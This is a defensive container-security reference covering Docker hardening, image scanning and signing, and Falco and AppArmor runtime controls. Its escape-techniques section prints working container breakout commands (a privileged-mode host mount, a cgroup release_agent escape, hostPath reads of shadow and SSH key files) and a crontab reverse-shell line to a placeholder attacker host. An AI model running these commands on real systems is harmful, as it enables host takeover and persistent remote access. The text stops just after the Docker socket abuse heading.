# Container Security Reference

> Comprehensive reference for Docker/container security, image hardening, runtime protection, and container escape defense. For Kubernetes orchestration security, see [KUBERNETES_SECURITY_REFERENCE.md](KUBERNETES_SECURITY_REFERENCE.md).

---

## Table of Contents

1. [Container Security Fundamentals](#1-container-security-fundamentals)
2. [Docker Bench for Security](#2-docker-bench-for-security)
3. [Dockerfile Security Best Practices](#3-dockerfile-security-best-practices)
4. [Container Image Scanning](#4-container-image-scanning)
5. [Container Runtime Security](#5-container-runtime-security)
6. [Container Escape Techniques and Defense](#6-container-escape-techniques-and-defense)
7. [Container Networking Security](#7-container-networking-security)
8. [Container Registry Security](#8-container-registry-security)
9. [Secrets in Containers](#9-secrets-in-containers)
10. [Container Security Operations](#10-container-security-operations)

---

## 1. Container Security Fundamentals

### Linux Kernel Primitives

Containers are not VMs — they are isolated processes that share the host kernel. Security depends entirely on these Linux primitives:

#### Namespaces

Namespaces provide isolation by giving each container its own view of system resources:

| Namespace | Flag | Isolates |
|-----------|------|----------|
| `pid` | `CLONE_NEWPID` | Process IDs — container processes cannot see host PIDs |
| `net` | `CLONE_NEWNET` | Network interfaces, routing tables, iptables rules |
| `mnt` | `CLONE_NEWNS` | Filesystem mount points, prevents seeing host mounts |
| `uts` | `CLONE_NEWUTS` | Hostname and NIS domain name |
| `ipc` | `CLONE_NEWIPC` | System V IPC, POSIX message queues |
| `user` | `CLONE_NEWUSER` | User/group ID mappings (UID 0 in container to non-root on host) |
| `cgroup` | `CLONE_NEWCGROUP` | cgroup root directory (kernel 4.6+) |
| `time` | `CLONE_NEWTIME` | Boot and monotonic clocks (kernel 5.6+) |

```bash
# View namespaces for a running container
ls -la /proc/$(docker inspect --format='{{.State.Pid}}' mycontainer)/ns/

# Inspect namespace isolation
lsns -p $(docker inspect --format='{{.State.Pid}}' mycontainer)
```

#### cgroups (Control Groups)

cgroups enforce resource limits, preventing denial-of-service from a compromised container:

```bash
# Set resource limits at run time
docker run -d   --memory="512m"   --memory-swap="512m"   --cpus="0.5"   --pids-limit=100   --ulimit nofile=1024:1024   myapp:latest

# Check cgroup limits for a running container
cat /sys/fs/cgroup/memory/docker/<container-id>/memory.limit_in_bytes
cat /sys/fs/cgroup/cpu/docker/<container-id>/cpu.cfs_quota_us
```

```yaml
# Docker Compose cgroup limits
services:
  app:
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
        reservations:
          memory: 256M
```

**Security implications:**
- Without `--pids-limit`, a fork bomb can exhaust host PIDs
- Without memory limits, OOM killer may kill critical host processes
- cgroups v2 provides unified hierarchy — preferred for modern container runtimes

#### Linux Capabilities

Capabilities break the monolithic root privilege into discrete units. Docker drops many by default:

**Default Docker capability set (kept):**
`CHOWN, DAC_OVERRIDE, FSETID, FOWNER, MKNOD, NET_RAW, SETGID, SETUID, SETFCAP, SETPCAP, NET_BIND_SERVICE, SYS_CHROOT, KILL, AUDIT_WRITE`

**Dangerous capabilities (never grant unless required):**

| Capability | Risk |
|------------|------|
| `CAP_SYS_ADMIN` | Near-root — enables mount, cgroup manipulation, container escape |
| `CAP_NET_ADMIN` | Modify routing tables, firewall rules, sniff traffic |
| `CAP_SYS_PTRACE` | Trace/inject into any process on host (with `--pid=host`) |
| `CAP_DAC_READ_SEARCH` | Bypass file permission checks — read any host file |
| `CAP_NET_RAW` | Raw socket access — ARP spoofing, packet injection |

```bash
# Drop all capabilities, add only what is needed
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp:latest

# Check capabilities of running container
docker inspect --format='{{.HostConfig.CapAdd}} {{.HostConfig.CapDrop}}' mycontainer
```

```yaml
# In docker-compose.yml
services:
  app:
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
```

#### Seccomp (Secure Computing Mode)

Seccomp filters system calls at the kernel level. Docker's default profile blocks ~44 dangerous syscalls:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_X32"],
  "syscalls": [
    {
      "names": ["accept", "accept4", "access", "adjtimex"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

```bash
# Apply custom seccomp profile
docker run --security-opt seccomp=/path/to/profile.json myapp:latest

# Disable seccomp (dangerous — only for debugging)
docker run --security-opt seccomp=unconfined myapp:latest

# Use default Docker seccomp profile explicitly
docker run --security-opt seccomp=default myapp:latest
```

**Syscalls blocked by Docker default seccomp:**
`acct, add_key, bpf, clock_adjtime, clock_settime, clone (with CLONE_NEWUSER), create_module, delete_module, finit_module, get_kernel_syms, init_module, ioperm, iopl, kcmp, kexec_file_load, kexec_load, keyctl, lookup_dcookie, mbind, mount, move_pages, nfsservctl, open_by_handle_at, perf_event_open, personality, pivot_root, process_vm_readv, process_vm_writev, ptrace, query_module, quotactl, reboot, request_key, set_mempolicy, setns, settimeofday, stime, swapon/off, sysfs, _sysctl, umount, umount2, unshare, uselib, userfaultfd, ustat, vm86, vm86old`

### Container vs. VM Isolation Comparison

| Property | Container | VM |
|----------|-----------|-----|
| Kernel | Shared with host | Separate kernel |
| Boot time | Milliseconds | Seconds to minutes |
| Isolation boundary | Namespaces + cgroups | Hardware virtualization |
| Attack surface | Shared kernel syscall interface | Hypervisor interface |
| Escape impact | Host kernel compromise | Hypervisor escape |
| Resource overhead | Near-zero | Significant |
| Storage | Layered (overlay2/devicemapper) | Virtual disk image |

**Isolation strength ranking (weakest to strongest):**
`Container > gVisor > Kata Containers > VM > Bare Metal`

### Docker Architecture

```
Docker Client (docker CLI)
        |
        | REST API / Unix socket
        v
Docker Daemon (dockerd)
  - Image management
  - Volume management
  - Network management
        |
        | gRPC
        v
containerd
  - Container lifecycle management
  - Image distribution
  - Snapshot management
        |
        v
containerd-shim-runc-v2
  - Daemonless container runtime
  - Keeps containers alive if daemon restarts
        |
        v
runc / runsc
  - OCI runtime implementation
  - Creates namespaces, cgroups, mounts
  - Executes container init process
```

**Security-relevant sockets:**
- `/var/run/docker.sock` — Docker daemon Unix socket; anyone with access = root on host
- `/run/containerd/containerd.sock` — containerd gRPC socket
- containerd shim socket — process-specific, used in CVE-2020-15257

### Container Threat Model

#### Image Threats
- Vulnerable base image packages (CVEs in OS libraries)
- Malicious layers in public registry images
- Secrets baked into image layers
- Outdated dependencies (pip/npm/gem packages)
- Unsigned/unverified images

#### Runtime Threats
- Container breakout via kernel exploits
- Privileged container abuse
- Process injection (ptrace)
- Resource exhaustion (fork bombs, memory bombs)
- Malicious processes spawned after startup

#### Network Threats
- Container-to-container lateral movement
- DNS rebinding from compromised container
- ARP spoofing within Docker bridge network
- Exposed daemon APIs
- Unencrypted inter-container traffic

#### Host Threats
- docker.sock volume mount abuse
- hostPath volume escape
- Host network namespace access
- Host PID namespace access
- Capability escalation to host

### OCI (Open Container Initiative) Standards

| Standard | Description |
|----------|-------------|
| OCI Image Spec | Defines container image format (manifest, config, layers) |
| OCI Runtime Spec | Defines container lifecycle and config.json format |
| OCI Distribution Spec | Defines registry API for image push/pull |
| OCI Artifacts | Extends distribution spec for non-image artifacts (SBOMs, signatures) |

```bash
# Inspect OCI image manifest
skopeo inspect docker://nginx:latest
skopeo inspect --raw docker://nginx:latest | jq .

# Convert between image formats
skopeo copy docker://nginx:latest oci:nginx-oci:latest
skopeo copy docker://nginx:latest docker-archive:nginx.tar:latest
```

---

## 2. Docker Bench for Security

Docker Bench for Security is an automated script that checks dozens of common best practices in deploying Docker in production, based on the **CIS Docker Benchmark**.

### Running the Benchmark

```bash
# Official Docker image (most up-to-date)
docker run --rm -it   --net host --pid host --userns host --cap-add audit_control   -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST   -v /etc:/etc:ro   -v /lib/systemd/system:/lib/systemd/system:ro   -v /usr/bin/containerd:/usr/bin/containerd:ro   -v /usr/bin/runc:/usr/bin/runc:ro   -v /usr/lib/systemd:/usr/lib/systemd:ro   -v /var/lib:/var/lib:ro   -v /var/run/docker.sock:/var/run/docker.sock:ro   --label docker_bench_security   docker/docker-bench-security

# Clone and run locally for customization
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
sudo sh docker-bench-security.sh

# Output to file for CI integration
sudo sh docker-bench-security.sh -l /tmp/docker-bench-$(date +%Y%m%d).log

# Run specific sections only
sudo sh docker-bench-security.sh -c container_images,container_runtime
```

**Output codes:**
- `[PASS]` — Check passed
- `[WARN]` — Check failed, needs remediation
- `[INFO]` — Informational, review recommended
- `[NOTE]` — Manual review required

### Key Check Categories

#### Section 1: Host Configuration

| Check | ID | Description | Remediation |
|-------|----|-------------|-------------|
| Separate partition for containers | 1.1 | /var/lib/docker on dedicated partition | Create dedicated LVM/partition during OS install |
| Hardened container host | 1.2 | Host OS should be minimal/hardened | Use container-optimized OS (Flatcar, Bottlerocket, CoreOS) |
| Docker group users | 1.3 | Members of docker group = root | Audit: `getent group docker`; remove non-admin users |
| Audit Docker daemon | 1.4 | auditd rules for Docker files | `auditctl -w /usr/bin/dockerd -k docker` |

```bash
# Recommended auditd rules for Docker
cat >> /etc/audit/rules.d/docker.rules << 'EOF'
-w /usr/bin/dockerd -k docker
-w /var/lib/docker -k docker
-w /etc/docker -k docker
-w /lib/systemd/system/docker.service -k docker
-w /lib/systemd/system/docker.socket -k docker
-w /etc/default/docker -k docker
-w /etc/docker/daemon.json -k docker
-w /usr/bin/containerd -k docker
-w /usr/bin/runc -k docker
EOF
augenrules --load
```

#### Section 2: Docker Daemon Configuration

| Check | ID | Description | Remediation |
|-------|----|-------------|-------------|
| Network traffic restriction | 2.1 | `--icc=false` prevents ICC | Set in daemon.json |
| Logging level | 2.2 | Set to `info` not `debug` | `"log-level": "info"` in daemon.json |
| iptables | 2.3 | Allow Docker iptables rules | Remove `--iptables=false` |
| Insecure registries | 2.4 | No insecure registries | Remove `insecure-registries` from daemon.json |
| TLS daemon | 2.6 | TLS for remote Docker daemon | Configure tlsverify, tlscacert, tlscert, tlskey |
| Content trust | 2.14 | Enable Docker Content Trust | `DOCKER_CONTENT_TRUST=1` |

```json
{
  "icc": false,
  "log-level": "info",
  "iptables": true,
  "no-new-privileges": true,
  "userland-proxy": false,
  "live-restore": true,
  "default-ulimits": {
    "nofile": { "Name": "nofile", "Hard": 64000, "Soft": 64000 }
  },
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  },
  "storage-driver": "overlay2",
  "userns-remap": "default"
}
```

#### Section 4: Container Images and Build Files

| Check | ID | Description | Remediation |
|-------|----|-------------|-------------|
| Container user | 4.1 | Do not use root | Add `USER nonroot` to Dockerfile |
| Trusted base images | 4.2 | Use official/verified images | Prefer Docker Official Images |
| No unnecessary packages | 4.3 | Remove unneeded packages | Multi-stage builds, distroless base |
| Image scanning | 4.4 | Scan images for vulnerabilities | Integrate Trivy/Grype in CI |
| Content trust | 4.5 | Enable content trust | `DOCKER_CONTENT_TRUST=1` |
| HEALTHCHECK | 4.6 | Add HEALTHCHECK to Dockerfile | `HEALTHCHECK CMD curl -f http://localhost/ \|\| exit 1` |
| setuid/setgid removal | 4.9 | Remove SUID/SGID binaries | `RUN find / -perm /6000 -exec chmod a-s {} +` |
| Sensitive info in build args | 4.10 | No secrets in ARG | Use BuildKit secrets instead |

#### Section 5: Container Runtime

| Check | ID | Description | Remediation |
|-------|----|-------------|-------------|
| AppArmor profile | 5.1 | Apply AppArmor profile | `--security-opt apparmor=docker-default` |
| Privileged mode | 5.4 | Do not use `--privileged` | Remove `--privileged` flag |
| Host network | 5.9 | Do not use `--network=host` | Use user-defined bridge networks |
| Memory limits | 5.10 | Set memory limits | `--memory=512m` |
| Read-only filesystem | 5.12 | `--read-only` flag | Mount writable dirs explicitly |
| Docker socket | 5.17 | Do not mount docker socket | Never `-v /var/run/docker.sock:/var/run/docker.sock` |
| New privileges | 5.21 | `--security-opt=no-new-privileges` | Add to every container |
| PIDs limit | 5.28 | Set `--pids-limit` | `--pids-limit=100` |

### Automating Bench in CI

```bash
# GitHub Actions example
- name: Docker Bench Security
  run: |
    docker run --rm       --net host --pid host --userns host --cap-add audit_control       -v /var/run/docker.sock:/var/run/docker.sock:ro       --label docker_bench_security       docker/docker-bench-security       -l /tmp/bench-report.log
    WARN_COUNT=$(grep -c WARN /tmp/bench-report.log || true)
    echo "WARN count: $WARN_COUNT"
    [ "$WARN_COUNT" -lt 10 ] || exit 1
```

---

## 3. Dockerfile Security Best Practices

### Hadolint — Dockerfile Linter

```bash
# Install hadolint
brew install hadolint                                    # macOS
wget -O hadolint https://github.com/hadolint/hadolint/releases/latest/download/hadolint-Linux-x86_64
chmod +x hadolint && mv hadolint /usr/local/bin/

# Run linting
hadolint Dockerfile
docker run --rm -i hadolint/hadolint < Dockerfile

# In CI with threshold
hadolint --failure-threshold error Dockerfile
hadolint --failure-threshold warning Dockerfile

# Ignore specific rules
hadolint --ignore DL3008 --ignore DL3009 Dockerfile

# Output formats
hadolint -f json Dockerfile
hadolint -f sarif Dockerfile > results.sarif   # For GitHub Security tab
```

```yaml
# .hadolint.yaml config
failure-threshold: warning
ignore:
  - DL3008
trustedRegistries:
  - docker.io
  - gcr.io
  - ghcr.io
```

**Key hadolint rules:**

| Rule | Description |
|------|-------------|
| DL3002 | Last USER should not be root |
| DL3003 | Use WORKDIR instead of cd |
| DL3006 | Always tag the version of the image used |
| DL3007 | Using latest is prone to errors — pin the version |
| DL3008 | Pin versions in apt-get install |
| DL3013 | Pin versions in pip install |
| DL3020 | Use COPY instead of ADD for file copying |
| DL3025 | Use arguments JSON notation for CMD and ENTRYPOINT |
| DL4000 | MAINTAINER is deprecated |
| SC2086 | Double quote to prevent globbing and word splitting |

### Secure Dockerfile Template

```dockerfile
# syntax=docker/dockerfile:1.6
# Build stage
FROM golang:1.22.2@sha256:d5302d40dc5fbbf38ec472d1848a9d2391a13f93293a6a5b0b87c204a60f7e8a AS builder

WORKDIR /build

COPY go.mod go.sum ./
RUN go mod download && go mod verify

COPY . .

RUN CGO_ENABLED=0 GOOS=linux go build     -ldflags="-s -w -extldflags=-static"     -trimpath     -o /app/server ./cmd/server

# Runtime stage — distroless for minimal attack surface
FROM gcr.io/distroless/static-debian12:nonroot

LABEL org.opencontainers.image.source="https://github.com/org/repo"
LABEL org.opencontainers.image.version="1.0.0"
LABEL org.opencontainers.image.licenses="MIT"

COPY --from=builder /app/server /server
COPY --chown=nonroot:nonroot config/ /etc/app/config/

USER nonroot:nonroot

ENTRYPOINT ["/server"]
CMD ["--config", "/etc/app/config/config.yaml"]

EXPOSE 8080

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3     CMD ["/server", "--healthcheck"]
```

### Security Rules Deep Dive

#### 1. Non-Root USER

```dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y myapp &&     groupadd -r appgroup && useradd -r -g appgroup appuser &&     chown -R appuser:appgroup /app
USER appuser
CMD ["myapp"]
```

#### 2. Minimal Base Images

| Image | Size | Attack Surface | Use Case |
|-------|------|----------------|----------|
| `ubuntu:22.04` | ~77MB | Large (full OS) | Development only |
| `alpine:3.19` | ~7MB | Small (musl libc) | Go, static binaries |
| `debian:slim` | ~30MB | Medium | Python, Node.js |
| `gcr.io/distroless/static` | ~2MB | Minimal (no shell) | Static binaries |
| `gcr.io/distroless/base` | ~20MB | Minimal (glibc only) | C/C++ apps |
| `gcr.io/distroless/python3` | ~50MB | Minimal (Python only) | Python apps |
| `scratch` | 0MB | None (empty) | Static binaries |

#### 3. Multi-Stage Builds

```dockerfile
FROM node:20-alpine AS deps
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:20-alpine AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
RUN npm run build

FROM node:20-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
RUN addgroup --system nodejs && adduser --system --ingroup nodejs nextjs
COPY --from=builder --chown=nextjs:nodejs /app/dist ./dist
COPY --from=deps --chown=nextjs:nodejs /app/node_modules ./node_modules
USER nextjs
EXPOSE 3000
CMD ["node", "dist/server.js"]
```

#### 4. No Secrets in Build Args / ENV

```dockerfile
# DANGEROUS: secret baked into image layer history
ARG DATABASE_PASSWORD
ENV DB_PASS=$DATABASE_PASSWORD

# SAFE: BuildKit secret mount (never written to layer)
# syntax=docker/dockerfile:1.6
RUN --mount=type=secret,id=pypi_token     pip install --index-url https://$(cat /run/secrets/pypi_token)@pypi.example.com/simple mypackage
```

```bash
# Build with BuildKit secret
docker build --secret id=pypi_token,src=$HOME/.pypi_token .
```

#### 5. Pinned Image Digests

```dockerfile
# Bad: :latest can change without warning
FROM nginx:latest

# Best: pinned by immutable SHA256 digest
FROM nginx:1.25.4@sha256:a484819eb60211f5299034ac80f6a681b06f89e65866ce91f356ed7c72af059c
```

```bash
# Get digest for current tag
docker pull nginx:1.25.4
docker inspect nginx:1.25.4 --format='{{index .RepoDigests 0}}'

# Using crane to get digest without pulling
crane digest nginx:1.25.4
```

#### 6. Remove SUID/SGID Binaries

```dockerfile
RUN find / -perm /6000 -type f -exec chmod a-s {} + 2>/dev/null || true
```

#### 7. Read-Only Filesystem at Runtime

```bash
docker run --read-only   --tmpfs /tmp:rw,noexec,nosuid,size=64m   --tmpfs /run:rw,noexec,nosuid,size=8m   myapp:latest
```

#### 8. .dockerignore

```dockerignore
.env
.env.*
*.pem
*.key
*.p12
id_rsa
.aws/
.gcp/
credentials
secrets/
node_modules/
__pycache__/
.git/
.github/
dist/
build/
```

---

## 4. Container Image Scanning

### Trivy — Comprehensive Vulnerability Scanner

```bash
# Install Trivy
brew install trivy
apt-get install trivy
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh

# Basic image scan
trivy image nginx:latest

# Filter by severity
trivy image --severity CRITICAL,HIGH myapp:latest

# JSON output for CI integration
trivy image --format json --output results.json myapp:latest

# Skip unfixed vulnerabilities
trivy image --ignore-unfixed myapp:latest

# Scan OCI archive
trivy image --input myapp.tar

# Filesystem scan (for local code)
trivy fs --scanners vuln,secret,misconfig ./

# Scan Dockerfile for misconfigurations
trivy config Dockerfile

# SBOM generation (CycloneDX)
trivy sbom --format cyclonedx image myapp:latest
trivy sbom --format spdx-json image myapp:latest

# Secret scanning
trivy image --scanners secret myapp:latest
```

**.trivyignore file (suppress known false positives):**

```
# CVE-2022-1234 - Not applicable to our use case
CVE-2022-1234
CVE-2023-5678 apt
```

**Trivy in CI (GitHub Actions):**

```yaml
- name: Run Trivy vulnerability scanner
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'myapp:${{ github.sha }}'
    format: 'sarif'
    output: 'trivy-results.sarif'
    severity: 'CRITICAL,HIGH'
    ignore-unfixed: true
    exit-code: '1'

- name: Upload Trivy scan results to GitHub Security tab
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: 'trivy-results.sarif'
```

### Grype — Anchore Vulnerability Scanner

```bash
# Install Grype
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Basic scan
grype myapp:latest

# JSON output
grype myapp:latest -o json

# Filter by severity
grype myapp:latest --fail-on critical

# Scan OCI archive
grype oci-archive:myapp.tar

# Scan filesystem
grype dir:/path/to/project

# Update vulnerability database
grype db update
```

### Snyk Container

```bash
# Authenticate
snyk auth

# Scan image
snyk container test myapp:latest

# Monitor (upload to Snyk platform)
snyk container monitor myapp:latest

# Fix — shows remediation
snyk container test myapp:latest --file=Dockerfile

# JSON output
snyk container test myapp:latest --json
```

### Registry Scanning

#### Amazon ECR

```bash
# Enable enhanced scanning (Trivy-powered)
aws ecr put-registry-scanning-configuration   --scan-type ENHANCED   --rules '[{"repositoryFilters":[{"filter":"*","filterType":"WILDCARD"}],"scanFrequency":"CONTINUOUS_SCAN"}]'

# Get scan results
aws ecr describe-image-scan-findings   --repository-name myapp   --image-id imageTag=latest

# Enable scan on push
aws ecr put-image-scanning-configuration   --repository-name myapp   --image-scanning-configuration scanOnPush=true
```

#### Harbor Registry with Trivy

```yaml
trivy:
  github_token: ${TRIVY_GITHUB_TOKEN}
  skip_update: false
  insecure: false
  timeout: 5m0s
scanOnPush: true
```

### Image Signing with Cosign (Sigstore)

```bash
# Install cosign
brew install cosign
go install github.com/sigstore/cosign/v2/cmd/cosign@latest

# Generate key pair
cosign generate-key-pair

# Sign image with private key
cosign sign --key cosign.key myregistry.io/myimage:tag

# Sign with keyless (OIDC)
cosign sign myregistry.io/myimage:tag

# Verify signature
cosign verify --key cosign.pub myregistry.io/myimage:tag

# Verify keyless signature
cosign verify   --certificate-identity=user@example.com   --certificate-oidc-issuer=https://accounts.google.com   myregistry.io/myimage:tag

# Attach SBOM attestation
cosign attest --predicate sbom.cdx.json --type cyclonedx myregistry.io/myimage:tag

# Verify attestation
cosign verify-attestation   --type cyclonedx   --key cosign.pub   myregistry.io/myimage:tag | jq '.payload | @base64d | fromjson'

# Sign in GitHub Actions (keyless OIDC)
# - uses: sigstore/cosign-installer@v3
# - run: cosign sign --yes myregistry.io/myimage:${{ github.sha }}
```

**Policy enforcement with Sigstore Policy Controller:**

```yaml
apiVersion: policy.sigstore.dev/v1beta1
kind: ClusterImagePolicy
metadata:
  name: require-signed-images
spec:
  images:
  - glob: "myregistry.io/**"
  authorities:
  - key:
      hashAlgorithm: sha256
      data: |
        -----BEGIN PUBLIC KEY-----
        MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAExxxxxxxxxxxxxxxxxxxxxxxxxxx==
        -----END PUBLIC KEY-----
```

---

## 5. Container Runtime Security

### Falco — eBPF Runtime Security

Falco detects anomalous container behavior using eBPF probes and pre-defined rules.

```bash
# Install Falco
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco   --namespace falco --create-namespace   --set driver.kind=ebpf   --set falcosidekick.enabled=true   --set falcosidekick.webui.enabled=true

# Run Falco with Docker (for testing)
docker run --rm -it   --privileged   -v /var/run/docker.sock:/host/var/run/docker.sock   -v /proc:/host/proc:ro   -v /boot:/host/boot:ro   -v /lib/modules:/host/lib/modules:ro   falcosecurity/falco:latest
```

#### Falco Rule Syntax

```yaml
- rule: <rule_name>
  desc: <human_readable_description>
  condition: <filter_expression>
  output: <output_format_string>
  priority: <EMERGENCY|ALERT|CRITICAL|ERROR|WARNING|NOTICE|INFORMATIONAL|DEBUG>
  tags: [<tag1>, <tag2>]
  enabled: <true|false>
  exceptions:
    - name: <exception_name>
      fields: [<field1>, <field2>]
      comps: [<comparator1>, <comparator2>]
      values:
        - [<val1>, <val2>]
```

#### Default Falco Rules (Critical)

```yaml
# 1. Terminal shell in container
- rule: Terminal Shell in Container
  desc: A shell was used as the entrypoint/exec point into a container with an attached terminal.
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
    and container_entrypoint
    and not user_expected_terminal_shell_in_container_conditions
  output: >
    A shell was spawned in a container with an attached terminal
    (user=%user.name %container.info shell=%proc.name cmdline=%proc.cmdline
     terminal=%proc.tty container_id=%container.id image=%container.image.repository)
  priority: NOTICE
  tags: [container, shell, mitre_execution]

# 2. Write below etc in container
- rule: Write below etc
  desc: An attempt to write to any file below /etc
  condition: >
    write_etc_common
    and not known_write_below_etc_activities
    and not run_by_package_mgmt_binaries
  output: >
    File below /etc opened for writing
    (user=%user.name command=%proc.cmdline file=%fd.name
     container_id=%container.id image=%container.image.repository)
  priority: ERROR
  tags: [filesystem, mitre_persistence]

# 3. Outbound connection to miner pool
- rule: Detect outbound connections to common miner pool ports
  desc: Miners often connect to specific pool ports
  condition: >
    net_miner_pool and not trusted_images_query_miner_domain_dns
  output: >
    Outbound connection to common miner pool port
    (user=%user.name command=%proc.cmdline connection=%fd.name
     container_id=%container.id image=%container.image.repository)
  priority: CRITICAL
  tags: [network, mitre_execution]
```

#### Custom Falco Rules Examples

```yaml
# Alert on sensitive file reads
- rule: Read sensitive file in container
  desc: An attempt to read sensitive files in a container
  condition: >
    open_read and container
    and (fd.name startswith /etc/shadow or
         fd.name startswith /etc/sudoers or
         fd.name startswith /root/.ssh)
  output: >
    Sensitive file read in container
    (user=%user.name file=%fd.name command=%proc.cmdline
     container_id=%container.id image=%container.image.repository)
  priority: WARNING
  tags: [file, container, credentials]

# Alert on privileged container creation
- rule: Privileged container started
  desc: A privileged container was started
  condition: >
    container_started and container
    and container.privileged=true
    and not trusted_privileged_containers
  output: >
    Privileged container started
    (user=%user.name command=%proc.cmdline %container.info
     image=%container.image.repository:%container.image.tag)
  priority: CRITICAL
  tags: [container, cis, mitre_privilege_escalation]

# Alert on Docker socket access from container
- rule: Docker socket API call from container
  desc: A process in a container is accessing the Docker socket
  condition: >
    evt.type = connect and container
    and fd.typechar = 'u'
    and fd.name = /var/run/docker.sock
  output: >
    Docker socket accessed from container
    (user=%user.name command=%proc.cmdline container_id=%container.id)
  priority: ERROR
  tags: [container, docker, escape]
```

#### Falco Sidekick — Alert Routing

```yaml
# falcosidekick values.yaml
config:
  slack:
    webhookurl: "https://hooks.slack.com/services/T00/B00/XXX"
    channel: "#security-alerts"
    minimumpriority: "warning"
  pagerduty:
    routingKey: "xxxxxxxxxxxxxxxx"
    minimumpriority: "critical"
  elasticsearch:
    hostport: "http://elasticsearch:9200"
    index: "falco"
    minimumpriority: "debug"
  loki:
    hostport: "http://loki:3100"
    minimumpriority: "debug"
```

### AppArmor Profiles for Containers

```bash
# Check if AppArmor is enabled
aa-status
cat /sys/module/apparmor/parameters/enabled

# Create custom AppArmor profile
cat > /etc/apparmor.d/docker-custom << 'EOF'
#include <tunables/global>

profile docker-custom flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  network,
  capability,
  file,
  umount,
  deny @{PROC}/* w,
  deny /sys/[^f]*/** wklx,
  deny /sys/firmware/efi/efivars/** rwklx,
  deny /sys/kernel/security/** rwklx,
}
EOF

# Load the profile
apparmor_parser -r -W /etc/apparmor.d/docker-custom

# Apply to container
docker run --security-opt apparmor=docker-custom myapp:latest
```

### Seccomp Profiles

```bash
# Apply custom seccomp profile
docker run --security-opt seccomp=/path/to/profile.json myapp:latest

# Minimal seccomp profile for a Go HTTP server
cat > seccomp-minimal.json << 'EOF'
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {
      "names": [
        "accept4", "arch_prctl", "bind", "brk", "clone", "close",
        "connect", "epoll_create1", "epoll_ctl", "epoll_wait",
        "exit", "exit_group", "fcntl", "fstat", "futex", "getpeername",
        "getsockname", "getsockopt", "listen", "madvise", "mmap",
        "mprotect", "munmap", "nanosleep", "open", "openat", "poll",
        "read", "rt_sigaction", "rt_sigprocmask", "rt_sigreturn",
        "setsockopt", "sigaltstack", "socket", "write"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
EOF
```

### gVisor — Kernel-Level Isolation

```bash
# Install gVisor runsc
wget https://storage.googleapis.com/gvisor/releases/release/latest/x86_64/runsc
chmod +x runsc && mv runsc /usr/local/bin/

# Configure Docker to use gVisor
# Add to /etc/docker/daemon.json:
# "runtimes": { "runsc": { "path": "/usr/local/bin/runsc" } }
systemctl reload docker

# Run container with gVisor
docker run --runtime=runsc myapp:latest

# Verify gVisor is running
docker run --runtime=runsc alpine uname -r
# Output: 4.4.0 (gVisor kernel version, not host)
```

### Kata Containers — VM-Level Isolation

```bash
# Install kata-containers
snap install kata-containers --classic

# Run with Kata runtime
docker run --runtime=kata-runtime myapp:latest
```

**Runtime isolation comparison:**

| Runtime | Isolation | Performance | Use Case |
|---------|-----------|-------------|----------|
| runc | Namespace/cgroups | Native | Standard workloads |
| gVisor (runsc) | User-space kernel | ~10-20% overhead | Untrusted code, multi-tenant |
| Kata Containers | Full VM (KVM) | ~5-15% overhead | High-security, compliance |
| Firecracker | Lightweight VM | ~1-5% overhead | Serverless (Lambda/Fargate) |

---

## 6. Container Escape Techniques and Defense

> These techniques are documented for defensive understanding and authorized penetration testing only.

### Escape Technique 1: Privileged Container

```bash
# Check if running in privileged mode
cat /proc/self/status | grep CapEff
# Full capabilities: 0000003fffffffff = privileged

# Escape via filesystem mount
mkdir /hostmnt
mount /dev/sda1 /hostmnt
chroot /hostmnt   # host root shell

# Escape via cgroup release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo "id > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Defense:**
- Never use `--privileged`
- Use Pod Security Standards: Restricted profile
- OPA/Gatekeeper or Kyverno policy to deny privileged containers

### Escape Technique 2: hostPath Volume Abuse

```bash
# If /host is mounted to host root:
chroot /host
# Access sensitive files:
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa
# Modify host crontab for persistence
echo '* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1' >> /host/etc/crontab
```

**Defense (Kyverno policy):**

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: deny-host-path
spec:
  validationFailureAction: enforce
  rules:
  - name: deny-host-path
    match:
      resources:
        kinds: [Pod]
    validate:
      message: "HostPath volumes are forbidden."
      deny:
        conditions:
          any:
          - key: "{{ request.object.spec.volumes[].hostPath | length(@) }}"
            operator: GreaterThan
            value: 0
```

### Escape Technique 3: Docker Socket Abuse

```bash
# Check for Docker socket in container
ls -la /var/run/docker.sock

# Create privileged container from within container
